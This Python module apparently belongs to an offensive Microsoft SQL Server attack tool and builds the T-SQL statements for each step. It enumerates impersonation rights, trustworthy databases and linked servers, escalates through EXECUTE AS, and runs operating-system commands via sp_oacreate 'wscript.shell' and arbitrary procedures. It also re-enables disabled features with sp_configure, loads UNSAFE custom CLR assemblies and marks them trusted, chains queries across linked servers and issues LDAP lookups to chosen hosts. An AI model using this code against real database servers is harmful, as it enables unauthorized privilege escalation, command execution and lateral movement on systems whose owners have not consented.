import utilities
from typing import Literal


def get_server_information() -> str:
    """
    This function is responsible to get the server information.
    """
    return "SELECT @@SERVERNAME as hostname, DEFAULT_DOMAIN() as domain_name, @@VERSION as version, @@servicename " \
           "as instance_name, USER_NAME() as db_user, SYSTEM_USER as server_user, DB_NAME() AS db_name;"


def get_trustworthy_db_list() -> str:
    """
    This function is responsible to get the trustworthy database list.
    """
    return "SELECT name FROM sys.databases WHERE is_trustworthy_on = 1;"


def get_impersonation_list(user_type: Literal['server', 'database']) -> str:
    if user_type == 'server':
        return "SELECT b.name as username FROM sys.server_permissions a INNER JOIN sys.server_principals b ON" \
               " a.grantor_principal_id = b.principal_id and a.permission_name = 'IMPERSONATE';"
    return "SELECT b.name as username FROM sys.database_permissions a INNER JOIN sys.database_principals b ON " \
           "a.grantor_principal_id = b.principal_id and a.permission_name = 'IMPERSONATE';"


def get_user_roles(user_type: Literal['server', 'database']) -> str:
    if user_type == 'server':
        return "SELECT p.name AS 'group' FROM sys.server_principals p JOIN sys.server_role_members m ON " \
               "p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"
    return "SELECT p.name AS 'group' FROM sys.database_principals p JOIN sys.database_role_members m " \
           "ON p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"


def impersonate_as(user_type: Literal['server', 'database'], user: str, query: str) -> str:
    if user_type == 'server':
        impersonation_template = "EXECUTE AS LOGIN = '{username}'; EXEC('[QUERY]');"
    else:
        impersonation_template = "EXECUTE AS USER = '{username}'; EXEC('[QUERY]');"
    impersonation_query = utilities.format_strings(impersonation_template, username=user)
    return utilities.replace_strings(impersonation_query, {"[QUERY]": query})


def get_user_list(user_type: str) -> str:
    if user_type not in ['server', 'database']:
        raise ValueError("User type must be 'server' or 'database'")
    if user_type == 'server':
        return "SELECT name as username FROM sys.server_principals WHERE type_desc LIKE '%_LOGIN' and type != 'C'" \
               " and is_disabled = 0 and name NOT LIKE 'NT %' and name NOT LIKE '##MS%';"
    return "SELECT name as username FROM sys.database_principals WHERE type_desc LIKE '%_USER' AND " \
           "authentication_type_desc != 'None' and name NOT LIKE '##MS%';"


def retrieve_linked_server_list() -> str:
    """
    This function is responsible to retrieve the linked server list.
    """
    return "SELECT name, provider, is_remote_login_enabled, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;"


def get_database_list() -> str:
    """
    This function is responsible to get the database list.
    """
    return "SELECT name FROM sys.databases WHERE database_id > 4"


def link_query(linked_server: str, query: str, method: str) -> str:
    """
    This function is responsible to link a query to a linked server.
    """
    method_list = ['OpenQuery', 'exec_at']
    if method not in method_list:
        raise Exception(f"Method {method} not supported. Supported methods: {method_list}")

    if method == 'OpenQuery':
        return utilities.format_strings("SELECT * FROM OPENQUERY(\"{linked_server}\", '{query}');",
                                        linked_server=linked_server, query=query)
    return utilities.format_strings("EXEC ('{query}') AT \"{linked_server}\";", linked_server=linked_server,
                                    query=query)


def is_procedure_exists(procedure_name: str) -> str:
    query = "SELECT CASE WHEN OBJECT_ID('{procedure_name}') IS NOT NULL THEN 'True' ELSE 'False' END as status;"
    return utilities.format_strings(query, procedure_name=procedure_name)


def execute_procedure(procedure_name: str, command: str) -> str:
    if procedure_name == 'sp_oacreate':
        query = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell," \
                " 'run', null, '{command}';"
        return utilities.format_strings(query, command=command)
    else:
        query = "EXEC {procedure_name} '{command}';"
        return utilities.format_strings(query, procedure_name=procedure_name, command=command)


def is_function_exists(function_name: str) -> str:
    query = "SELECT CASE WHEN OBJECT_ID('{function_name}') IS NOT NULL THEN 'True' ELSE 'False' END as status;"
    return utilities.format_strings(query, function_name=function_name)


def execute_function(function_name: str, command: str, db_user: str = None) -> str:
    query = "SELECT {db_user}.{function_name}({command});"
    return utilities.format_strings(query, db_user=db_user, function_name=function_name, command=command)


def create_procedure(asm_name: str, procedure_name: str, args: str) -> str:
    query = "CREATE PROCEDURE [{procedure_name}] {args} AS EXTERNAL NAME [{asm_name}].[StoredProcedures]." \
            "[{procedure_name}];"
    return utilities.format_strings(query, asm_name=asm_name, procedure_name=procedure_name, args=args)


def create_function(db_user: str, function_name: str, asm_name: str, namespace: str, class_name: str, args: str):
    query = "CREATE FUNCTION [{db_user}].{function_name}({args}) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME {asm_name}." \
            "[{namespace}.{class_name}].{function_name};"
    return utilities.format_strings(query, db_user=db_user, function_name=function_name, asm_name=asm_name,
                                    namespace=namespace, class_name=class_name, args=args)


def set_server_options(link_name: str, feature: str, status: str) -> str:
    if status not in ['true', 'false']:
        raise ValueError("Status must be 'true' or 'false'")
    query = "EXEC sp_serveroption '{link_name}','{feature}','{status}';"
    return utilities.format_strings(query, link_name=link_name, feature=feature, status=status)


def is_procedure_accessible(procedure_name: str) -> str:
    query = "SELECT CASE WHEN OBJECT_ID('{procedure_name}', 'X') IS NOT NULL THEN 'True' ELSE 'False'" \
            " END AS [is_accessible];"
    return utilities.format_strings(query, procedure_name=procedure_name)


def is_procedure_enabled(procedure_name: str) -> str:
    custom_names = {
        "sp_oacreate": "Ole Automation Procedures"
    }
    procedure_name = procedure_name if procedure_name not in custom_names.keys() else custom_names[procedure_name]
    query = "SELECT CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = '{procedure_name}') = 1 " \
            "THEN 'True' ELSE 'False' END AS [status];"
    return utilities.format_strings(query, procedure_name=procedure_name)


def reconfigure_procedure(procedure_name: str, status: int) -> str:
    custom_names = {
        "sp_oacreate": "Ole Automation Procedures"
    }
    procedure_name = procedure_name if procedure_name not in custom_names.keys() else custom_names[procedure_name]
    return utilities.format_strings("EXEC sp_configure '{procedure_name}', {status}; RECONFIGURE;",
                                    procedure_name=procedure_name, status=status)


def is_assembly_exists(assembly_name: str) -> str:
    query = "SELECT CASE WHEN EXISTS (SELECT 1 FROM sys.assemblies WHERE name = '{asm_name}') THEN 'True' ELSE 'False'" \
            " END as status;"
    return utilities.format_strings(query, asm_name=assembly_name)


def add_custom_assembly(asm_name: str, asm_file_location: str) -> str:
    custom_asm_hex = utilities.hexlify_file(asm_file_location)
    query = "CREATE ASSEMBLY {asm_name} FROM {custom_asm} WITH PERMISSION_SET = UNSAFE;"
    return utilities.format_strings(query, custom_asm=custom_asm_hex, asm_name=asm_name)


def is_custom_asm_trusted(asm_file_location: str) -> str:
    my_hash = utilities.calculate_sha512_hash(asm_file_location)
    query = "SELECT CASE WHEN EXISTS (SELECT 1 FROM sys.trusted_assemblies WHERE hash = {my_hash}) THEN 'True' ELSE " \
            "'False' END AS [status];"
    return utilities.format_strings(query, my_hash=my_hash)


def trust_custom_asm(asm_file_location: str) -> str:
    my_hash = utilities.calculate_sha512_hash(asm_file_location)
    query = "EXEC sp_add_trusted_assembly @hash = {my_hash}, @description = N'Trusted Assembly for My Application';"
    return utilities.format_strings(query, my_hash=my_hash)


def untrust_custom_asm(asm_file_location: str) -> str:
    my_hash = utilities.calculate_sha512_hash(asm_file_location)
    query = "EXEC sp_drop_trusted_assembly @hash = {my_hash};"
    return utilities.format_strings(query, my_hash=my_hash)


def drop_procedure(procedure_name: str) -> str:
    return utilities.format_strings("DROP PROCEDURE {procedure_name};", procedure_name=procedure_name)


def drop_function(function_name: str) -> str:
    return utilities.format_strings("DROP FUNCTION {function_name};", function_name=function_name)


def drop_custom_asm(asm_name: str) -> str:
    return utilities.format_strings("DROP ASSEMBLY {asm_name};", asm_name=asm_name)


def ldap_query(hostname: str, port: int) -> str:
    return utilities.format_strings("SELECT * FROM 'LDAP://{hostname}:{port}' ", hostname=hostname, port=port)
